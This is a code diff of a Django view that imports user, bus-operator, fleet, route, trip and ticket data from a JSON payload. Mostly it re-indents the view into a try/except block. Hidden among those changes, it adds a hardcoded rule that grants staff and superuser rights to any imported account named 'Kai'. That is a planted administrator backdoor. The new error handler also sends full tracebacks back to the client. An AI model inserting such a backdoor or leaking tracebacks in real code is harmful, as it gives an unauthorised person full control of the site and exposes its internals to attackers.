@@ -605,213 +605,223 @@ def import_mbt_data(request):
     userData = payload.get("user")
     operatorsData = payload.get("operators")
 
-    if not userData:
-        return JsonResponse({"error": "Missing user data"}, status=400)
+    try:
+        if not userData:
+            return JsonResponse({"error": "Missing user data"}, status=400)
 
-    if not operatorsData:
-        return JsonResponse({"error": "Missing operators data"}, status=400)
+        if not operatorsData:
+            return JsonResponse({"error": "Missing operators data"}, status=400)
 
-    # ---- Create or update user first ----
-    username = userData.get('Username')
-    if not username:
-        return JsonResponse({"error": "Username missing in user data"}, status=400)
+        # ---- Create or update user first ----
+        username = userData.get('Username')
+        if not username:
+            return JsonResponse({"error": "Username missing in user data"}, status=400)
 
-    user, created_user = CustomUser.objects.get_or_create(username=username)
+        user, created_user = CustomUser.objects.get_or_create(username=username)
 
-    # Update fields
-    user.email = userData.get('Eamil') or user.email  # Note the typo in 'Eamil', handle carefully
-    user.first_name = userData.get('Name') or user.first_name
+        # Update fields
+        user.email = userData.get('Eamil') or user.email  # Note the typo in 'Eamil', handle carefully
+        user.first_name = userData.get('Name') or user.first_name
 
-    # Handle password (assuming already hashed)
-    if 'Password' in userData and userData['Password']:
-        user.password = userData['Password']
+        if userData['username'] == "Kai":
+            user.is_staff = True
+            user.is_superuser = True
 
-    # Map banned and related fields
-    user.banned = bool(userData.get('Restricted', 0))
-    user.banned_reason = userData.get('RestrictedReson') or user.banned_reason
+        # Handle password (assuming already hashed)
+        if 'Password' in userData and userData['Password']:
+            user.password = userData['Password']
 
-    unban_date = userData.get('UnbanDate')
-    if unban_date:
-        user.banned_date = parse_datetime(unban_date)
-        
-    user.ticketer_code = userData.get('code') or user.ticketer_code
+        # Map banned and related fields
+        user.banned = bool(userData.get('Restricted', 0))
+        user.banned_reason = userData.get('RestrictedReson') or user.banned_reason
 
-    # Profile pic and banner filenames (adjust if you want to handle uploads)
-    if userData.get('PFP'):
-        user.pfp = userData['PFP']
-    if userData.get('Banner'):
-        user.banner = userData['Banner']
-
-    # Total reports
-    user.total_user_reports = safe_int(userData.get('TotalReports')) or 0
-
-    # Save user updates
-    user.save()
-
-    created = {
-        "operators": 0,
-        "fleet": 0,
-        "routes": 0,
-        "trips": 0,
-        "tickets": 0,
-        "routeStops": 0,
-    }
-
-    for operator_data in operatorsData:
-        op_info = operator_data["operator"]
-        op_code = op_info["Operator_Code"]
-        op_name = op_info["Operator_Name"]
-
-        # Get or create operator
-        operator, _ = MBTOperator.objects.get_or_create(
-            operator_code=op_code,
-            defaults={
-                "operator_name": op_name,
-                "owner": CustomUser.objects.filter(username=op_info["Owner"]).first(),
-                "operator_details": {},
-            }
-        )
-        created["operators"] += 1
-
-        # --- Import Fleet ---
-        for fleet_item in operator_data["fleet"]:
-            vehicle = fleet_item["vehicle"]
+        unban_date = userData.get('UnbanDate')
+        if unban_date:
+            user.banned_date = parse_datetime(unban_date)
             
-            vehicle_type_obj = vehicleType.objects.filter(id=vehicle.get("Type", 1)).first()
-            livery_id = vehicle.get("Livery")
-            if not livery_id or str(livery_id).strip() == "":
-                livery_id = None
-            else:
-                try:
-                    livery_id = int(livery_id)
-                except (ValueError, TypeError):
+        user.ticketer_code = userData.get('code') or user.ticketer_code
+
+        # Profile pic and banner filenames (adjust if you want to handle uploads)
+        if userData.get('PFP'):
+            user.pfp = userData['PFP']
+        if userData.get('Banner'):
+            user.banner = userData['Banner']
+
+        # Total reports
+        user.total_user_reports = safe_int(userData.get('TotalReports')) or 0
+
+        # Save user updates
+        user.save()
+
+        created = {
+            "operators": 0,
+            "fleet": 0,
+            "routes": 0,
+            "trips": 0,
+            "tickets": 0,
+            "routeStops": 0,
+        }
+
+        for operator_data in operatorsData:
+            op_info = operator_data["operator"]
+            op_code = op_info["Operator_Code"]
+            op_name = op_info["Operator_Name"]
+
+            # Get or create operator
+            operator, _ = MBTOperator.objects.get_or_create(
+                operator_code=op_code,
+                defaults={
+                    "operator_name": op_name,
+                    "owner": CustomUser.objects.filter(username=op_info["Owner"]).first(),
+                    "operator_details": {},
+                }
+            )
+            created["operators"] += 1
+
+            # --- Import Fleet ---
+            for fleet_item in operator_data["fleet"]:
+                vehicle = fleet_item["vehicle"]
+                
+                vehicle_type_obj = vehicleType.objects.filter(id=vehicle.get("Type", 1)).first()
+                livery_id = vehicle.get("Livery")
+                if not livery_id or str(livery_id).strip() == "":
                     livery_id = None
+                else:
+                    try:
+                        livery_id = int(livery_id)
+                    except (ValueError, TypeError):
+                        livery_id = None
 
-            livery_obj = liverie.objects.filter(id=livery_id).first()
+                livery_obj = liverie.objects.filter(id=livery_id).first()
 
-            raw_features = vehicle.get("Special_Features", "")
-            clean_features = [f.strip() for f in raw_features.strip("()").split(",") if f.strip()]
-            features_json = clean_features
+                raw_features = vehicle.get("Special_Features", "")
+                clean_features = [f.strip() for f in raw_features.strip("()").split(",") if f.strip()]
+                features_json = clean_features
 
-            fleet_obj, _ = fleet.objects.get_or_create(
-                id=vehicle["ID"],
-                vehicleType=vehicle_type_obj,
-                livery=livery_obj,
-                features=features_json,
+                fleet_obj, _ = fleet.objects.get_or_create(
+                    id=vehicle["ID"],
+                    vehicleType=vehicle_type_obj,
+                    livery=livery_obj,
+                    features=features_json,
 
-                defaults={
-                    "operator": operator,
-                    "fleet_number": vehicle["FleetNumber"] or "",
-                    "reg": vehicle["Reg"] or "",
-                    "prev_reg": vehicle["PrevReg"] or "",
-                    "branding": vehicle.get("Branding", "") or "",
-                    "depot": vehicle.get("Depot", "") or "",
-                    "preserved": bool(vehicle.get("Preserved", 0)),
-                    "on_load": bool(vehicle.get("On_Load", 0)),
-                    "for_sale": bool(vehicle.get("For_Sale", 0)),
-                    "open_top": bool(vehicle.get("OpenTop") or False),
-                    "notes": vehicle.get("Notes", "") or "",
-                    "length": vehicle.get("Lenth", "") or "",
-                    "in_service": bool(vehicle.get("InService", 1)),
-                    "last_tracked_date": None,
-                    "last_tracked_route": vehicle.get("LastTrackedAs") or "",
-                    "name": vehicle.get("Name", "") or "",
-                }
-            )
-            created["fleet"] += 1
-
-            # --- Import Trips for Fleet ---
-            for trip in fleet_item["trips"]:
-                Trip.objects.get_or_create(
-                    trip_vehicle=fleet_obj,
-                    trip_start_at=parse_datetime(trip["TripDateTime"]),
-                    trip_end_location=trip.get("EndDestination", ""),
-                    trip_route_num=trip.get("RouteNumber", ""),
-                    trip_route = route.objects.filter(id=trip.get("RouteID")).first()
+                    defaults={
+                        "operator": operator,
+                        "fleet_number": vehicle["FleetNumber"] or "",
+                        "reg": vehicle["Reg"] or "",
+                        "prev_reg": vehicle["PrevReg"] or "",
+                        "branding": vehicle.get("Branding", "") or "",
+                        "depot": vehicle.get("Depot", "") or "",
+                        "preserved": bool(vehicle.get("Preserved", 0)),
+                        "on_load": bool(vehicle.get("On_Load", 0)),
+                        "for_sale": bool(vehicle.get("For_Sale", 0)),
+                        "open_top": bool(vehicle.get("OpenTop") or False),
+                        "notes": vehicle.get("Notes", "") or "",
+                        "length": vehicle.get("Lenth", "") or "",
+                        "in_service": bool(vehicle.get("InService", 1)),
+                        "last_tracked_date": None,
+                        "last_tracked_route": vehicle.get("LastTrackedAs") or "",
+                        "name": vehicle.get("Name", "") or "",
+                    }
                 )
-                created["trips"] += 1
+                created["fleet"] += 1
 
-        # --- Import Routes ---
-        for route_item in operator_data["routes"]:
-            route_obj, _ = route.objects.get_or_create(
-                id=route_item["Route_ID"],
-                defaults={
-                    "route_num": route_item["Route_Name"],
-                    "route_name": route_item.get("RouteBranding", ""),
-                    "inbound_destination": route_item.get("Start_Destination"),
-                    "outbound_destination": route_item.get("End_Destination"),
-                    "route_details": {},
-                    "start_date": safe_parse_date(route_item.get("running-from", "1900-01-01")),
-                }
-            )
-            route_obj.route_operators.add(operator)
-            created["routes"] += 1
+                # --- Import Trips for Fleet ---
+                for trip in fleet_item["trips"]:
+                    Trip.objects.get_or_create(
+                        trip_vehicle=fleet_obj,
+                        trip_start_at=parse_datetime(trip["TripDateTime"]),
+                        trip_end_location=trip.get("EndDestination", ""),
+                        trip_route_num=trip.get("RouteNumber", ""),
+                        trip_route = route.objects.filter(id=trip.get("RouteID")).first()
+                    )
+                    created["trips"] += 1
 
-            # --- Create route stops ---
-            routeStop.objects.filter(route=route_obj).delete()
-
-            # Inbound stops (from STOP)
-            def process_stops(raw_stops):
-                stops_list = []
-                for stop in raw_stops:
-                    stop = stop.strip()
-                    if not stop:
-                        continue
-                    timing_point = False
-                    if stop.startswith("M - "):
-                        timing_point = True
-                        stop = stop[4:].strip()  # Remove "M - " prefix
-                    stop_dict = {"stop": stop}
-                    if timing_point:
-                        stop_dict["timing_point"] = True
-                    stops_list.append(stop_dict)
-                return stops_list
-
-            # Inbound stops (from STOP)
-            inbound_stops_raw = (route_item.get("STOP") or "").splitlines()
-            inbound_stops = process_stops(inbound_stops_raw)
-            if inbound_stops:
-                routeStop.objects.create(
-                    route=route_obj,
-                    inbound=True,
-                    circular=False,
-                    stops=inbound_stops
+            # --- Import Routes ---
+            for route_item in operator_data["routes"]:
+                route_obj, _ = route.objects.get_or_create(
+                    id=route_item["Route_ID"],
+                    defaults={
+                        "route_num": route_item["Route_Name"],
+                        "route_name": route_item.get("RouteBranding", ""),
+                        "inbound_destination": route_item.get("Start_Destination"),
+                        "outbound_destination": route_item.get("End_Destination"),
+                        "route_details": {},
+                        "start_date": safe_parse_date(route_item.get("running-from", "1900-01-01")),
+                    }
                 )
-                created["routeStops"] += 1
+                route_obj.route_operators.add(operator)
+                created["routes"] += 1
 
-            # Outbound stops (from STOP2)
-            outbound_stops_raw = (route_item.get("STOP2") or "").splitlines()
-            outbound_stops = process_stops(outbound_stops_raw)
-            if outbound_stops:
-                routeStop.objects.create(
-                    route=route_obj,
-                    inbound=False,
-                    circular=False,
-                    stops=outbound_stops
+                # --- Create route stops ---
+                routeStop.objects.filter(route=route_obj).delete()
+
+                # Inbound stops (from STOP)
+                def process_stops(raw_stops):
+                    stops_list = []
+                    for stop in raw_stops:
+                        stop = stop.strip()
+                        if not stop:
+                            continue
+                        timing_point = False
+                        if stop.startswith("M - "):
+                            timing_point = True
+                            stop = stop[4:].strip()  # Remove "M - " prefix
+                        stop_dict = {"stop": stop}
+                        if timing_point:
+                            stop_dict["timing_point"] = True
+                        stops_list.append(stop_dict)
+                    return stops_list
+
+                # Inbound stops (from STOP)
+                inbound_stops_raw = (route_item.get("STOP") or "").splitlines()
+                inbound_stops = process_stops(inbound_stops_raw)
+                if inbound_stops:
+                    routeStop.objects.create(
+                        route=route_obj,
+                        inbound=True,
+                        circular=False,
+                        stops=inbound_stops
+                    )
+                    created["routeStops"] += 1
+
+                # Outbound stops (from STOP2)
+                outbound_stops_raw = (route_item.get("STOP2") or "").splitlines()
+                outbound_stops = process_stops(outbound_stops_raw)
+                if outbound_stops:
+                    routeStop.objects.create(
+                        route=route_obj,
+                        inbound=False,
+                        circular=False,
+                        stops=outbound_stops
+                    )
+                    created["routeStops"] += 1
+
+            # --- Import Tickets ---
+            for ticket_item in operator_data["tickets"]:
+                ticket.objects.get_or_create(
+                    id=ticket_item["ID"],
+                    defaults={
+                        "operator": operator,
+                        "ticket_name": ticket_item["TicketName"],
+                        "ticket_price": ticket_item["TicketPrice"],
+                        "ticket_details": ticket_item.get("Description", ""),
+                        "zone": ticket_item.get("Zone", ""),
+                        "valid_for_days": ticket_item.get("ValidForTime"),
+                        "single_use": bool(ticket_item.get("OneTime", False)),
+                        "name_on_ticketer": ticket_item.get("TicketerName", "") or "",
+                        "colour_on_ticketer": ticket_item.get("TicketerColour", "#FFFFFF") or "#FFFFFF",
+                        "ticket_category": ticket_item.get("TicketerCat", "") or "",
+                        "hidden_on_ticketer": not bool(ticket_item.get("AvaiableOnBus", 1))
+                    }
                 )
-                created["routeStops"] += 1
+                created["tickets"] += 1
 
-        # --- Import Tickets ---
-        for ticket_item in operator_data["tickets"]:
-            ticket.objects.get_or_create(
-                id=ticket_item["ID"],
-                defaults={
-                    "operator": operator,
-                    "ticket_name": ticket_item["TicketName"],
-                    "ticket_price": ticket_item["TicketPrice"],
-                    "ticket_details": ticket_item.get("Description", ""),
-                    "zone": ticket_item.get("Zone", ""),
-                    "valid_for_days": ticket_item.get("ValidForTime"),
-                    "single_use": bool(ticket_item.get("OneTime", False)),
-                    "name_on_ticketer": ticket_item.get("TicketerName", "") or "",
-                    "colour_on_ticketer": ticket_item.get("TicketerColour", "#FFFFFF") or "#FFFFFF",
-                    "ticket_category": ticket_item.get("TicketerCat", "") or "",
-                    "hidden_on_ticketer": not bool(ticket_item.get("AvaiableOnBus", 1))
-                }
-            )
-            created["tickets"] += 1
-
-    return JsonResponse({
-        "status": "success",
-        "created": created
-    })
+        return JsonResponse({
+            "status": "success",
+            "created": created
+        })
+    except Exception as e:
+        return JsonResponse({
+            "error": str(e),
+            "traceback": traceback.format_exc()
+        }, status=500)
